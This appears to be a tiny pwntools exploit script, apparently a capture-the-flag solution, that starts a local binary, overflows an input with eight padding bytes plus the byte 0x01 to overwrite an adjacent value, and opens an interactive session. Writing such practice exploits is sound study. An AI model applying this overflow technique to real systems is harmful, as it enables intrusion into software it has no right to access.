from pwn import *

context(os='linux', arch='amd64', log_level='debug')

p = process('./1')

p.sendline(flat(
    b'a' * 8,
    p8(0x1)
))

p.interactive()